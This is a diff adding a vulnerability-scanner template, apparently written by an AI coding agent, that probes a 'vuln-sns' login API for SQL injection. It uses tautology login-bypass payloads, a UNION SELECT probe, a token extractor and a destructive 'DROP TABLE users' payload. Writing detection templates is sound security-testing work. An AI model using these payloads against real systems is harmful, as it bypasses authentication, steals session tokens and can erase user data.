@@ -1,0 +1,136 @@
+id: vuln-sns-login-sql-injection
+
+info:
+  name: vuln-sns Login SQL Injection
+  author: devin
+  severity: critical
+  description: SQL injection vulnerability in login endpoint due to unsafe string concatenation in SQL query
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    max-request: 4
+  tags: sqli,login,vuln-sns
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+    
+    headers:
+      Content-Type: application/json
+    
+    body: |
+      {
+        "user_id": "admin' OR '1'='1' -- ",
+        "password": "test"
+      }
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "token"
+        part: body
+      
+      - type: status
+        status:
+          - 200
+      
+      - type: word
+        words:
+          - "application/json"
+        part: header
+
+    extractors:
+      - type: json
+        json:
+          - '.token'
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+    
+    headers:
+      Content-Type: application/json
+    
+    body: |
+      {
+        "user_id": "test' UNION SELECT 1,2,3 -- ",
+        "password": "anything"
+      }
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "token"
+        part: body
+      
+      - type: word
+        words:
+          - "syntax error"
+          - "mysql"
+          - "union"
+        condition: or
+        part: body
+        case-insensitive: true
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+    
+    headers:
+      Content-Type: application/json
+    
+    body: |
+      {
+        "user_id": "admin",
+        "password": "test' OR '1'='1' -- "
+      }
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "token"
+        part: body
+      
+      - type: word
+        words:
+          - "syntax error"
+          - "mysql"
+        condition: or
+        part: body
+        case-insensitive: true
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+    
+    headers:
+      Content-Type: application/json
+    
+    body: |
+      {
+        "user_id": "'; DROP TABLE users; -- ",
+        "password": "test"
+      }
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "syntax error"
+          - "mysql"
+          - "drop"
+          - "table"
+        condition: or
+        part: body
+        case-insensitive: true
+      
+      - type: status
+        status:
+          - 500
